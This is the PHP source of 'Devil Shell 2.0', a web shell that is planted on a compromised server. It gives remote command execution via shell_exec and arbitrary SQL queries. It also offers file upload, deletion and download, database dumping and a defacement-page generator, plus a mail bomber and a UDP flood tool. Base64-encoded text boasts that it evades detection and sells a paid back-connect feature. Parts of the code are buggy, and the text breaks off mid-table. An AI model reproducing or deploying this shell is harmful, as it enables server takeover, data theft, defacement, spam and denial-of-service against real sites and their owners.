<?php
//========================================//
//========+++DEVIL SHELL 2.0v+++==========//
//========================================//
//====+++CODED BY UNDERGROUNDE DEVIL+++===//
//========================================//
//=====+++TEAM NUTS|| teamnuts.in+++=====//
//========================================//
//====+++EMAIL ID UGDEVIL@GMAIL.COM+++====//
//========================================//
session_start();
ob_start();
error_reporting(0);
@set_time_limit(0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
?>

<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/> 
<title>υη∂єяgяσυη∂ ∂єνιℓ: αη ιη∂ιαη нα¢кєя</title>
<head><script type=text/javascript>
function only_num(x)
{
y=x.replace(/[^\d]{1,100}/,'' );
return y;
}
</script></head>
<body text=#336666 bgcolor="#0000000" style="font-family: Courier New, Courier, monospace;
font-size: 14px;" oncontextmenu="return false;">
<?php
$pstr="Q3JlZGl0IDogVW5kZXJncm91bmQgRGV2aWwgJm5ic3A7ICB8DQo8YSBocmVmPSJodHRwOi8vdGVhbW51dHMuaW4iPlRlYW0gTnV0czwvYT4NCnwgJm5ic3A7IEVtYWlsOiB1Z2RldmlsQGdtYWlsLmNvbQ==";
	$pv=@phpversion();
	$self=$_SERVER["PHP_SELF"];
	$sm = @ini_get('safe_mode');
	
	if(isset($_GET['open']))
	{
		chdir($_GET['open']);
		$_SESSION['dir']=$_GET['open'];
	}
	else if(isset($_GET['create']))
	{
		chdir($_GET['create']);
		$_SESSION['dir']=$_GET['create'];
	}
		
 if(isset($_POST['dsub']))
	{
		header('location:'.$self."?open=".$_POST['ndir']);
	}

	function validate_email($e1,$e2,$n)
	{
	
	if( (filter_var($e1,FILTER_VALIDATE_EMAIL)) && (filter_var($e2,FILTER_VALIDATE_EMAIL)) )
	{
	if(is_numeric($n))
	{
	$error="";
	return $error;
	}
	else
	{
	$error="Enter valid number of messages";
	
	}
	}
	else
	{
	$error="Enter Valid Email Id";}
	return $error;
	}
	
	function devil_download($path)
	{
	header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename='.basename($path));
    header('Content-Transfer-Encoding: binary');
    header('Expires: 0');
    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
    header('Pragma: public');
    header('Content-Length: ' . filesize($path));
    ob_clean();
    flush();
    readfile($path);
    exit;
	}
	function sept()
		{
			$sepr=explode('?',$self);
			echo $sepr[0];
		}
		

if(isset($_SESSION['a'])&& !isset($_GET['edit']))
{	
	function dis()
	{
		if(!ini_get('disable_functions'))
		{
			echo "None";
		}
		else
		{
			echo @ini_get('disable_functions');
		}
	}
	function logout()
	{
	session_destroy();
	header('location:'.$self);
	}
	function yip()
	{
		echo $_SERVER["REMOTE_ADDR"];
	}
	function odi()
	{
		$od = @ini_get("open_basedir");
		echo $od;
	}
	function sip()
	{
		echo getenv('SERVER_ADDR');
	}
	function cip()
	{
		echo $_SERVER["SERVER_NAME"];
	}
	function  safe()
	{
		echo($sm?"YES":"NO");
	}
	function browse()
	{
		$brow= $_SERVER["HTTP_USER_AGENT"];
		print($brow);
	}
	function db_run($server,$user,$pass,$db,$query)
	{
		mysql_connect($server,$user,$pass) or die('enable to connect server');
		mysql_select_db($db) or die('enable to connect DB');
		$q1=mysql_query($query) or die('QUERY ERROR');
		$exp=explode($query," ");
		if($exp[0]=='SELECT')
		{
			while($p=mysql_fetch_array($q1))
			{
				echo "";
			}
		}
		echo "Query Run Successfulyy...";
	}
	function split_dir()
	{
		$de=explode("/",getcwd());
		$del=$de[0];
		for($count=0;$count<sizeof($de);$count++)
		{
		$imp=$imp.$de[$count].'/';
			
		echo "<a href=".$self."?open=".$imp.">".$de[$count]."</a> / ";
		}
		
	}
	function search_file($new)
	{
		$de=explode("\\",getcwd());
		$del=$de[0];echo "Finding Files.....<br><br>";
		for($count=0;$count<sizeof($de);$count++)
		{
		$imp=$imp.$de[$count].'/';
		chdir($imp);
			if($handle = opendir('./'))
			{
				
			while (false !== ($file = readdir($handle))) 
				{
						
				if($file==$new)
					{
					echo "<br>$file-<a href=".$self."?edit=".$imp."$file>Edit</a><br>";
					}
		   				
				}
			}
		}
		
		echo "<br><br>";
	}

function devil_dump($host,$user,$pass,$name,$tables = '*')
{
	
	$link = mysql_connect($host,$user,$pass);
	mysql_select_db($name,$link);
	
	//get all of the tables
	if($tables == '*')
	{
		$tables = array();
		$result = mysql_query('SHOW TABLES');
		while($row = mysql_fetch_row($result))
		{
			$tables[] = $row[0];
		}
	}
	else
	{
		$tables = is_array($tables) ? $tables : explode(',',$tables);
	}
	foreach($tables as $table)
	{
		$result = mysql_query('SELECT * FROM '.$table);
		$num_fields = mysql_num_fields($result);
		
		$return.= 'DROP TABLE '.$table.';';
		$row2 = mysql_fetch_row(mysql_query('SHOW CREATE TABLE '.$table));
		$return.= "\n\n".$row2[1].";\n\n";
		
		for ($i = 0; $i < $num_fields; $i++) 
		{
			while($row = mysql_fetch_row($result))
			{
				$return.= 'INSERT INTO '.$table.' VALUES(';
				for($j=0; $j<$num_fields; $j++) 
				{
					$row[$j] = addslashes($row[$j]);
					$row[$j] = ereg_replace("\n","\\n",$row[$j]);
					if (isset($row[$j])) { $return.= '"'.$row[$j].'"' ; } else { $return.= '""'; }
					if ($j<($num_fields-1)) { $return.= ','; }
				}
				$return.= ");\n";
			}
		}
		$return.="\n\n\n";
	}
	
	//save file
$tname=date("mys");
$tempdb="db_".$tname.".sql";
$open = fopen($tempdb,'w+');
fwrite($open,$return);
devil_download($tempdb);
}

	function mysql_ver() 
		{
			$output = shell_exec('mysql -V');
			 preg_match('@[0-9]+\.[0-9]+\.[0-9]+@', $output, $ver);
			 return $ver[0];
		}

	if(isset($_GET['delete']))
		{
			unlink($_GET['delete']);
			$redir=$_GET['delete'];
			rmdir($_GET['delete']);
			header('location:'.$self.'?open='.$_SESSION['dir']);
		}
	function disk($this)
	{
		if($this=='2')
		$ds=disk_free_space(".");
	else
	$ds=disk_total_space(".");
	
	 if($ds>=1073741824) 
		 {
		 $ds=number_format(($ds/1073741824),2)." gb";
		 }
	else if($ds>=1048576)  
		 {
		 $ds=number_format(($ds/1048576),2)." mb";
		 }
	else if($size >= 1024) 
		 {
		 $ds=number_format(($ds/1024),2)." kb";
		 }
	 else
		{
		 $ds=$ds." byte";
		}

return $ds;
	}
		

	if($_GET['u']=='logout')
	{
		logout();
		header('location:'.$self);
	}
	else if(isset($_POST['u']))
	{
		move_uploaded_file($_FILES['a']['tmp_name'],$_SESSION['dir']."/".$_FILES['a']['name']);
		move_uploaded_file($_FILES['b']['tmp_name'],$_SESSION['dir']."/".$_FILES['b']['name']);
		move_uploaded_file($_FILES['c']['tmp_name'],$_SESSION['dir']."/".$_FILES['c']['name']);
		header('location:'.$self."?open=".$_SESSION['dir']);
	}

	$str="PHN0eWxlIHR5cGU9InRleHQvY3NzIj4NCjwhLS0NCi5zdHlsZTEge2NvbG9yOiAjRkZGRkZGfQ0KDQouc3R5bGUyIHsNCgljb2xvcjogI0ZGRkZGRjsNCglmb250LXNpemU6IDM2cHg7DQoJZm9udC13ZWlnaHQ6IGJvbGQ7DQp9DQouc3R5bGUzIHsNCglmb250LXNpemU6IDM2Ow0KCWZvbnQtd2VpZ2h0OiBib2xkOw0KfQ0KLS0+DQo8L3N0eWxlPg0KPHAgY2xhc3M9InN0eWxlMiI+ICA8dT5EZXZpbCBWMi4wIFBIUCBTaGVsbDwvdT4gIDwvcD4NCjxwPiA8YnI+DQogIERldmlsIFYxLjMgUEhQIFNoZWxsIGlzIGEgUEhQIFNjcmlwdCwgd2hpY2ggaXMgaGFyZGx5IGRldGVjdGFibGUgYXMgIG1hbGljaW91cyBjb2RlIGNyZWF0ZWQgZm9yIGNoZWNraW5nIHRoZSB2dWxuZXJhYmlsaXR5IGFuZCBzZWN1cml0eSAgY2hlY2sgb2YgYW55IHdlYiBzZXJ2ZXIgb3Igd2Vic2l0ZS4gWW91IGNhbiBjaGVjayB5b3VyIFdlYnNpdGUgYW5kICA/cmVtb3RlIHdlYiBzZXJ2ZXIgU2VjdXJpdHkuIFRoaXMgc2hlbGwgcHJvdmlkZSB5b3UgbW92ZSBpbiBzZXJ2ZXIgIGRpcmVjdG9yeSAsdmlld2luZyBmaWxlcyBwcmVzZW50IGluIGRpcmVjdG9yeSAseW91IGNhbj8gZGVsZXRlICxlZGl0ICBhbmQgdXBsb2FkIHByb2ZpbGVzLiBNb3JlIG92ZXIgeW91IGNhbiBjaGVjayA6IDxzcGFuIGNsYXNzPSJzdHlsZTEiPjxzdHJvbmc+U2VydmVyIElQICxZb3VyIElQLCBIb3N0ZWQgUEhQIFZlcnNpb24gLCBTZXJ2ZXIgUG9ydCwgU2FmZSBtb2RlIDogWWVzL05vLCBEaXNrIFNwYWNlLCBmcmVlIFNwYWNlLE1haWwgQm9tYmluZzwvc3Ryb25nPiA8c3Ryb25nPkREb1MgQXR0YWNrLE1haWwgQm9tYmluZyxDcmVhdGUgRmlsZSBhbmQgRm9sZGVyPC9zdHJvbmc+PC9zcGFuPjxzdHJvbmc+IGV0Yzwvc3Ryb25nPiA8L3A+DQo8cD48c3Ryb25nPjx1PkF0dHJhY3RpdmUgZmVhdHVyZSB3aGljaCBtYWtlIGRpZmZlcmVudCB3aXRoIG90aGVyIHNoZWxsPC91Pjwvc3Ryb25nPjwvcD4NCjx1bD4NCiAgPGxpPlVuZGV0ZWN0YWJsZSBieSBHb29nbGUgRG9yazwvbGk+DQogIDxsaT5CYWNrLUNvbm5lY3QgW0F2YWlsYWJsZSBpbiBQYWlkIFZlcnNpb25dPC9saT4NCiAgPGxpPkRhdGFiYXNlIER1bXAgW0F1dG9tYXRpYyBEdW1wIGF2YWlsYWJsZSBpbiBQYWlkIFZlcnNpb25dPC9saT4NCiAgPGxpPlNRTCBhbmQgTGludXggQ29tbWFuZCBSdW48L2xpPg0KICA8bGk+RnJvbnQvRGVmYWNlIFBhZ2UgQ3JlYXRvcjwvbGk+DQogIDxsaT5NYWlsIEJvbWJlciBUZXN0aW5nPC9saT4NCiAgPGxpPkREb1MgYXR0YWNrZXIgVGVzdGluZzwvbGk+DQogIDxsaT5TZWxmIGtpbGw8L2xpPg0KICA8bGk+SW5kaXZpdXNhbCBMb2dpbidzPC9saT4NCjwvdWw+DQo8cD4gPHU+PHN0cm9uZz5MaW1pdGF0aW9uczwvc3Ryb25nPiA8L3U+PGJyPg0KICBNb3N0bHkgRnVuY3Rpb24gYXJlIHdvcmtpbmcgb24gbGludXggc2VydmVycy4gPC9wPg0KPHA+IDxzdHJvbmc+PHU+QWJvdXQgQ29kZXI8L3U+PC9zdHJvbmc+IDogPGJyPg0KICBTY3JpcHQgaXMgY3JlYXRlZCBieSBVbmRlcmdyb3VuZCBEZXZpbCBhbiBJbmRpYW4gRXRoaWNhbCBoYWNrZXIuSSBsaWtlIHRvIHRoYW5rZnVsIHRvIG15IG1hdGVzIDxzcGFuIGNsYXNzPSJzdHlsZTEiPkFuZWVzaCxSYWh1bCBhbmQgTWF5YW5rPC9zcGFuPiB3aG8gaW5zcGlyZSBhbmQgaGVscGVkIG1lIHRvIGRldmVsb3AgdGhpcyBjb2RlLiA8L3A+DQo8cD4gWW91IGNhbiBkb3dubG9hZD8gdGhpcyBzY3JpcHQgZnJvbSA8c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly93d3cudGVhbW51dHMuaW4iPnd3dy50ZWFtbnV0cy5pbjwvYT48L3N0cm9uZz4gPyAudGhpcyBpcyByZWxlYXNlIHVuZGVyIDxzcGFuIGNsYXNzPSJzdHlsZTEiPjxzdHJvbmc+R05VIEdFTkVSQUwgUFVCTElDIExJQ0VOU0U8L3N0cm9uZz48L3NwYW4+IDwvcD4NCjxwPiA8c3Ryb25nPjx1PkRlY2xhcmF0aW9uOjwvdT4gPC9zdHJvbmc+IDxicj4NCiAgVGhpcyBzY3JpcHQgb25seSBmb3IgZWR1Y2F0aW9uIHB1cnBvc2Ugb3IgdGVzdGluZyB5b3VyIG93biBzZXJ2ZXIuRG9uJ3QgbWlzcyB1c2UgaXQgb3RoZXJ3aXNlICB0aGUgc2NyaXB0IG1ha2VyIGlzIG5vdCByZXNwb25zaWJlIGZvciBhbnkgY2FzdWFsaXR5IG9yIGRhbWFnZS4gPC9wPg0KPHA+IDxzdHJvbmc+PHU+SW5zdGFsbGF0aW9uOjwvdT48L3N0cm9uZz4gPGJyPg0KICBTaW1wbGUgaW5zdGFsbGF0aW9uIGp1c3QgcGVuZXRyYXRlIHRoZSBmaWxlIHVzaW5nIEZUUCBvciBodG1sIFVwbG9hZGVyIG9uIHNlcnZlciBhbmQgY2hlY2sgdGhlIHNpdGUgdnVsbmVyYWJpbGl0eS4gPC9wPg0KPHA+IFRoaXMgaXMgcGFzc3dvcmQgcHJvdGVjdGVkIHNoZWxsIHNvIHlvdSBjYW4gc2VuZCBlbWFpbCB0byBnZXQgdXNlcm5hbWUgb3IgcGFzc3dvcmQgPGJyPg0KICBhdCA8c3BhbiBjbGFzcz0ic3R5bGUxIj51Z2RldmlsQGdtYWlsLmNvbTwvc3Bhbj4gPC9wPg0KPHA+IDxzdHJvbmc+PHU+U3VnZ2VzdGlvbi9CdWcvUmVwb3J0OjwvdT48L3N0cm9uZz4gPGJyPg0KICBPdXIgdGVhbSBkbyB0aGUgaGFyZHdvcmsgZm9yIG1ha2luZyB0aGlzLGFmdGVydGhhdCBpZiB5b3UgZmluZCBhbnkgYnVncywgZG9uJ3QgaGVzaXRhdGUgdG8gaW5mb3JtIG1lIGF0IHVnZGV2aWxAZ21haWwuY29tIDwvcD4NCjxwPiBEb3dubG9hZCA8YnI+DQogIFlvdSBjYW4gZG93bmxvYWQgc2hlbGwgZnJvbSA8c3Ryb25nPjxhIGhyZWY9Imh0dHA6Ly93d3cudGVhbW51dHMuaW4iPnd3dy50ZWFtbnV0cy5pbjwvYT48L3N0cm9uZz4gYW5kIGFsc28gdmlzaXQgPHN0cm9uZz48YSBocmVmPSJodHRwOi8vd3d3LnRlYW1udXRzLmluIj53d3cudGVhbW51dHMuaW48L2E+PC9zdHJvbmc+ICAgZm9yIGxhdGVzdCB2ZXJzaW9uLm9yIHlvdSBjYW4gbWFpbCBtZSBmb3IgdGhpcyBzY3JpcHQgYXQgIHVnZGV2aWxAZ21haWwuY29tIDwvcD4NCg==";

	
?>
<table width=100%>
<tr><td bgcolor="#000000"><table>
<tr height=20><td width=100  bgcolor=orange></td><td rowspan=3 width=700><font color=#33CCCC face="Monotype Corsiva" size=7><?php echo base64_decode("RGV2aWwgU2hlbGw="); ?></font> <font color=#FFffff><?php echo base64_decode('VjIuMA=='); ?></font></td><td rowspan=3><?php echo base64_decode('PGltZyBzcmM9aHR0cDovL2kxMTc5LnBob3RvYnVja2V0LmNvbS9hbGJ1bXMveDM5MC9wYXVsbW9uY3kvdGVhbW51dHMvbG9nby5wbmcgYWx0PSJVbmRlcmdyb3VuZCBEZXZpbCIgaGVpZ2h0PTcwPg=='); ?></td></tr>
<tr width=100 height=20 bgcolor=white><th><font color=blue><?php echo base64_decode("SU5ESUE="); ?></font></th></tr>
<tr width=100 height=20 bgcolor=green><td></td></tr>
</table>

</td>
</tr>
<tr><td bgcolor="#000000">	<hr class=li><a href=<?php echo $self."?open="; ?>>Shell</a> | <a href=<?php echo $self."?create=".$_SESSION['dir']?>>Create File</a>  | 
<a href=<?php echo $self."?bc"; ?>><font color=#FF6633 size=2>Back Connect</font></a> |
<a href=<?php echo $self."?run"; ?>>Run Command[<font color=#FF6633 size=2>NEW</font>]</a> |
<a href=<?php echo $self."?mail"; ?>>Mail Bomber</a> |
<a href=<?php echo $self."?dos"; ?>>DOS ATTACK</a> |
<a href=<?php echo $self;?>?warning>Declaration</a> |
<br><a href=<?php echo $self;?>?cdp>Create Deface Page</a> |
<a href=<?php echo $self;?>?sf>Search File[<font color=#FF6633 size=2>NEW</font>]</a> |
<a href=<?php echo $self;?>?dd>Database Dump[<font color=#FF6633 size=2>NEW</font>]</a> |
<a href=<?php echo $self."?moreinfo"; ?>>More Information</a>  |
<a href=<?php echo $self."?phpinfo"; ?>>PHP Info</a> | <br>
<a href=http://www.teamnuts.in target=_blank>Shell Tutorial</a> | 
<a href=<?php echo $self;?>?self>Self Kill</a> |
<a href=<?php echo $self;?>?u=logout>Logout</a></td>
</tr>
<tr><td bgcolor="#000000">	<hr  class=li><span class=hd>Server IP :</span><span class=head> <?php cip(); ?></span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class=hd>Your IP : </span><span class=head> <?php yip(); ?></span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class=hd>PHP Version : </span> <span class=head><?php echo $pv; ?></span>

&nbsp;&nbsp;<span class=hd>Server Port :</span> <span class=head><?php echo $_SERVER['SERVER_PORT'];?></span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class=hd>Safe Mode :</span> <span class=head><?php safe();?></span>
&nbsp;&nbsp;&nbsp;&nbsp;<span class=hd>Disk Space :</span> <span class=head><?php echo disk(1);?></span><br>
<br><span class=hd>free Space :</span> <span class=head><?php echo disk(2);?></span>

<span class=hd>Your System info :</span> <span class=head><?php echo php_uname(); ?></span>

<br><br>
<span class=hd>Directory : </span> <span class=head><?php echo split_dir();?></span> <span class=hd>View Other Directories</span> <span class=head>[<a href=<?php echo $self;?>?open=c:/>C:</a>]</span> | <span class=head>[<a href=<?php echo $self;?>?open=D:/>D:</a>]</span>
| <span class=head>[<a href=<?php echo $self;?>?open=E:/>E:</a>]</span>
	<hr class=li>
</td></tr>
<tr><td bgcolor="#000000">
<table  width=100% class=tab>

<?php
	if(isset($_GET['create']))
	{
		if(isset($_SESSION['a']))
		{
			echo "<form action=$self?edit=".$_SESSION['a']." method=post>";
		}
		else
		{
			echo "<form action=$self?edit= method=post>";

		}

	?>
	<center>
	<table>
	<tr><td><span class=head>File Name </span> </td><td><input type=text name=fn size=70></td></tr>
	<tr><td colspan=2><span class=head>File content</td></tr>
	<tr><th colspan=2><center><textarea rows=15 cols=70 name=fc></textarea></th></tr>
<tr><th colspan=2><input type=submit value="Create File">
	</th></tr></table>
	</form>
	<?php
	}
	else if(isset($_GET['cdp']))
	{
	?>	<form action=# method=post>
<table>
<tr><td>Save At : </td><td><input type=text name=sa value=<?php echo realpath(''); ?>></td></tr>
<tr><td>FILE NAME : </td><td><input type=text name=fn></td></tr>
<tr><td>FILE Title: </td><td><input type=text name=ft size=50></td></tr>
<tr><td>BACKGROUND COLOR : </td><td><input type=text value=#000000 name=bc></td></tr>
<tr><td>Main Picture : </td><td><input type=text name=pic> WIDTH <input type=text name=w size=10 value=400>HEIGHT <input type=text name=h value=300></td></tr>
<tr><td>First Head Line : </td><td><input type=text name=fh size=50> COLOR <input type=text name=col1 value=#FF0033></td></tr>
<tr><td>Material : </td><td><textarea name=mat rows=10 cols=50></textarea> COLOR <input type=text name=col2 value=#fffff><br>Center Material BG COLOR <input type=text name=col4 value=#fff></td></tr>
<tr><td>Footer Note : </td><td><input type=text name=foot> COLOR <input type=text name=col3 value=#ff0033></td></tr>
<tr><th colspan=2><input type=submit value="CREATE DEFACE PAGE"></th></tr>
</table>
</form>
<?php
$filn=$_POST['fn'];
$sa=$_POST['sa'];
$bc=$_POST['bc'];
$pic=$_POST['pic'];
$fh=$_POST['fh'];
$ft=$_POST['ft'];
$mat=nl2br($_POST['mat']);
$foot=$_POST['foot'];
$w=$_POST['w'];
$h=$_POST['h'];
$c1=$_POST['col1'];
$c2=$_POST['col2'];
$c3=$_POST['col3'];
$c4=$_POST['col4'];
echo $filn;
if(!empty($filn))
{
$fil=fopen($sa."/".$filn,'w');
fwrite($fil,"<html><title>".$ft."</title><body bgcolor=".$bc." text=#ffff><br><br><center><img src=".$pic." width=".$w." height=".$h."><br><h2><font color=".$c1.">".$fh."</font></h2>

<table width=700 height=50 bgcolor=".$c4."  style='border:double; border-color:#FF0033;'> <tr><td><p><font color=".$c2.">".$mat."</font></p>
</td></tr></table>
<br><br><p><font color=".$c3.">".$foot."</font></p>
");
header('location:'.$self."?done=".$filn);
}


}
else if(isset($_GET['sf']))
	{
		echo "<br><br><form action=# method=post>Search File : <input type=text name=s_f><input type=submit value='Search File'> </form><br><br>";
		if(!empty($_POST['s_f']))
		search_file($_POST['s_f']);
	}

else if(isset($_GET['done']))
	{
		echo "<br><br>".$_GET['done']." PAGE CREATE Successfully Move To Shell Home Page <a href=".$self.">Click HERE</a>";
	}
	else if(isset($_GET['warning']))
	{
	
		echo base64_decode($str);

	}
else if(isset($_GET['phpinfo']))
{
	echo "<center>".phpinfo();
}
else if(isset($_GET['self']))
{
	unlink(__FILE__);
}
else if(isset($_GET['dd']))
{
	?>
	<center>Mannually</center>
	<hr width=100 class=li>
	<form action=# method=post>
	<table cellspacing=10>
	<tr><td width=200>Server Name</td><td width=200><input type=text name=s1></td><td rowspan=4 width=300><?php echo base64_decode('PGZvbnQgY29sb3I9I2ZmZmZmZj5OT1RFOiBBdXRvbWF0aWMgZGF0YWJhc2UgZmV0Y2ggZmVhdHVyZSBhbHNvIGF2YWlsYWJsZSBpbiBwYWlkIHZlcnNpb24='); ?></td></tr>
	<tr><td>Server Username</td><td><input type=text name=s2></td></tr>
	<tr><td>Server Password</td><td><input type=text name=s3></td></tr>
	<tr><td>Database Name</td><td><input type=text name=s4></td></tr>
	<tr><td colspan=2><input type=submit Value='Take Dump'></td></tr>
	</table>
	</form>
	<hr class=li>
	<?php
	if(!empty($_POST['s1']))
	{
		echo "<script language=javascript>
alert('hello');
</script>";
	devil_dump('localhost','root','','cms');
	}

}
else if(isset($_GET['run']))
	{
	echo "<br><br><table><tr><td><table class=tab><tr><td><form action=# method=post>
	Run Linux command : <input type=text name=rc> <input type=submit value='Run Command'></form></td></tr></table>";
	echo "<br><br><form action=# method=post>
	<table cellspacing=5 class=tab>
	<tr><td width=200>Server Name</td><td width=200><input type=text name=s1></td></tr>
	<tr><td>Server Username</td><td><input type=text name=s2></td></tr>
	<tr><td>Server Password</td><td><input type=text name=s3></td></tr>
	<tr><td>Database Name</td><td><input type=text name=s4></td></tr>
	<tr><td>Command</td><td><textarea rows=2 cols=50 name=s5></textarea></td></tr>
	
	<tr><td colspan=2><input type=submit Value='Run Command'></td></tr>
	</table>
	</form></td><td><h2>Result</h2><textarea rows=14 cols=60 class=tab>
	";
	if(!empty($_POST['rc']))
		{
		echo shell_exec($_POST['rc']);
		}
	else if(!empty($_POST['s1']))
		{
		echo $_POST['s5']."\r\n";
		db_run($_POST['s1'],$_POST['s2'],$_POST['s3'],$_POST['s4'],$_POST['s5']);
		}
	echo "</textarea></td></tr>
	<tr><td rowspan=3>".base64_decode('PGZvbnQgY29sb3I9I2ZmZmZmZj5OT1RFOiBBdXRvbWF0aWMgZGF0YWJhc2UgZmV0Y2ggZmVhdHVyZSBhbHNvIGF2YWlsYWJsZSBpbiBwYWlkIHZlcnNpb24=')."</td></tr>
	</table>";

	}
else if(isset($_GET['moreinfo']))
	{
	?>
	<center>

<table width=90%>
<tr><th colspan=2 width=200> Brief Information </th></tr>
<tr><td class=head><b>Server Admin : </td><td><?php echo $_SERVER['SERVER_ADMIN']; ?></td></tr>
<tr><td class=head><b>Server Name : </td><td><?php cip(); ?></td></tr>
<tr><td class=head><b>Server IP : </td><td> <?php cip(); ?> </td></tr>
<tr><td class=head><b>Server PORT : </td><td><?php echo $_SERVER['SERVER_PORT'];?></td></tr>
<tr><td class=head><b>Safe Mode : </td><td><?php echo @ini_get("safe_mode")?("<b>Enable(<font color=red>Secure</font>)"):("Disable(<font color=white>Insecure</font>)"); ?></td></tr>
<tr><td class=head><b>Base Directory : </td><td><?php echo @ini_get("open_basedir")?("<b>Enable(<font color=red>Secure</font>)"):("Disable(<font color=white>Insecure</font>)"); ?></td></tr>
<tr><td class=head><b>Your IP : </td><td><?php yip(); ?></td></tr>
<tr><td class=head><b>PHP VERSION : </td><td><?php echo $pv; ?></td></tr>
<tr><td class=head><b>Curl</td><td><?php echo function_exists('curl_version')?("<b>Enable"):("Disable"); ?></td></tr>
<tr><td class=head><b>Oracle : </td><td><?php echo function_exists('ocilogon')?("<b>Enable"):("Disable"); ?></td></tr>
<tr><td class=head><b>MySQL : </td><td><?php  echo function_exists('mysql_connect')?("<b>Enable"):("Disable");?></td></tr>
<tr><td class=head><b>MSSQL :</td><td><?php echo function_exists('mssql_connect')?("<b>Enable"):("Disable"); ?></td></tr>
<tr><td class=head><b>PostgreSQL :</td><td><?php echo function_exists('pg_connect')?("<b>Enable"):("Disable"); ?></td></tr>
<tr><td class=head><b>Disable functions :</td><td><?php dis(); ?></td></tr>
<tr><td class=head><b>Total Disk Space : </td><td><?php echo disk(1);?></td></tr>
<tr><td class=head><b>Free Space : </td><td><?php echo disk(2);?></td></tr>
<tr><td class=head><b>OS</td><td><?php echo php_uname(); ?></td></tr>
<tr><td class=head><b>Server Software : </td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td></tr>


</table>
	<?php
	}
else if(isset($_GET['bc']))
	{
	echo base64_decode('PGNlbnRlcj48YnI+PGJyPjxicj48YnI+PGZvbnQgY29sb3I9I2ZmZmZmZmY+QXZhaWxibGUgb24gUGFpZCBWZXJzaW9uIGNvbnRhY3QgVW5kZXJncm91bmQgRGV2aWwgdG8gcHVyY2hhc2UgYXQgdWdkZXZpbEBnbWFpbC5jb208L2ZvbnQ+PGJyPjxicj48L2NlbnRlcj48YnI+PGJyPjxicj4=');
	}
else if(isset($_GET['download']))
	{
	$size = filesize($_GET['download']);
	$r=explode('//',$_GET['download']);
	for($i=0;$i<sizeof($r);$i++)
		{
		$fd=$r[$i];
		}
	devil_download($fd);	
			
	}
	else if(isset($_GET['mail']))
	{
	
	if(isset($_POST['send_email']))
{

$_POST['num']=stripslashes($_POST['num']);
$_POST['sen'] = stripslashes($_POST['sen']); 
$_POST['rec'] = stripslashes($_POST['rec']); 
$_POST['sub'] = stripslashes($_POST['sub']); 
$_POST['msg'] = stripslashes($_POST['msg']); 


$sen=$_POST['sen'];
$rec=$_POST['rec'];
$num=$_POST['num'];
$sub=$_POST['sub'];
$msg=$_POST['msg'];



if(($sen!="")&&($rec!="")&&($num!="")&&($sub!="")&&($msg!=""))
{

$error=validate_email($sen,$rec,$num);
if($error=="")
{
$headers = "MIME-Version: 1.0\r\n"; 
$headers .= "Content-type: text/plain"."; charset=windows-1251\r\n"; 

$headers .= "From: ".$sen; 

for($i=0;$i<$num;$i++)
{

mail($rec,$sub,$msg,$headers) or die('<b>Message Sending Failed</b>');


}


}
}
else
{
$error="Fill all the fields";

}
}
	$zzz=<<<zzx
<form action= $self?mail= method="post">
<table>
<tr><td><b>Sender's Email</b></td><td><input type=text name=sen size=50 value=$sen></td></tr>
<tr><td><b>Receipent's Email</b></td><td><input type=text name=rec  size=50 value=$rec ></td></tr>
<tr><td><b>Number</b></td><td><input type=text size=50 name=num  onkeyup="this.value=only_num(this.value)" maxlength=7 value=$num></td></tr>
<tr><td><b>Subject</b></td><td><input type=text size=50 name=sub value=$sub></td></tr>
<tr><td><b>Message</b></td><td><textarea name=msg rows=10 cols=80 >$msg</textarea></td></tr>
<tr><td></td><td><input type=submit name=send_email value=send ></td></tr><br/>
<tr><td colspan="2"><p style=" font-size:25px"><b>$error</b></p></td></tr>
</table>
</form>
zzx;
echo $zzz;


	}
else if(isset($_GET['rename']))
	{
		echo "<form action=# method=post>New File name <input type=text name=rf><br><input type=submit value='Rename File' name=srf></form>";
		if(isset($_POST['srf']))
		{
			rename($_GET['rename'],$_POST['rf']);
			header('location:'.$self."?open=".$_SESSION['dir']);
		}
	}
	else if(isset($_GET['dos']))
	{
		if(!isset($_POST['dsub']))
		{
			echo "<center><form action=# method=post><table><tr><td colspan=2><h2>DOS ATACK</h2> <tr><td>Target Server IP : </td><td><input type=text name=ddos value=".$_SERVER["SERVER_NAME"]."></td></tr>
		<tr><td>Server Port : </td><td><input type=text name=dpos value=".$_SERVER['SERVER_PORT']."></td></tr>
		<tr><td>Time Execution : </td><td><input type=text name=dtim></td></tr>
		<tr><th colspan=2><input type=Submit  name=dsub value='attack--->'></th></tr>
		<tr><td colspan=2 height=100></td></tr>
		</form></table>";
		}
		else
		{
			
			$sip=$_POST['ddos'];
			$port=$_POST['dpos'];
			$t=time()+$_POST['dtim'];
			$send = 0;
			print "DOS Atack on $ip using ".$port."PORT <br><br>";
			for($i=0;$i<99999;$i++)
				{
					$get .= "FLOOD";
				}
				do
				{
					$send++;
				}
				while(time() > $max_time);
				
        
			$fo = fsockopen("udp://$sip", $port, $errno, $errstr, 5);
			if($fo)
				{
                fwrite($fo, $get);
                fclose($fo);
				}

			echo "DOS completed @ ".date("h:i:s A")."<br> Total Data Send [" . number_format(($send*65)/1024, 0) . " MB]<br> Average Data per second [". number_format($send/$_POST['dtim'], 0) . "]";
		}
	}
else if($handle = opendir('./'))
 {
  while (false !== ($file = readdir($handle))) 
  {
  if(is_dir($file))
     {
    $directories[] = $file;
     }
     else
     {
    $files[] = $file;
     }
  }
 asort($directories);
 asort($files);
 $kb=filesize($file)/1024;
 
foreach($directories as $file)
  { if($bg%2==0)
	   echo "<tr bgcolor=#353535>";
	   else
		   echo "<tr bgcolor=#242424>";
	    $kb=number_format(filesize($file)/1024,2);
	  echo "
 <td valign=top><a href=".$self."?open=".realpath('.')."/".$file."><span class=li>".$file."</span> </a></td><td class=li> &nbsp;&nbsp;&nbsp;&nbsp;...<td valign=top class=li width=200>".date ("m/d/Y | H:i:s", filemtime($file))."</td>
 <th width=100><font color=white>".substr(sprintf('%o', fileperms(realpath(''))), -3)."</td>
 <td><a href=".$self."?open=".realpath('.')."/".$file."><span class=li>Open</span></a> | <a href=".$self."?delete=".realpath('.')."/".$file."><span class=li>Delete</span></a> 
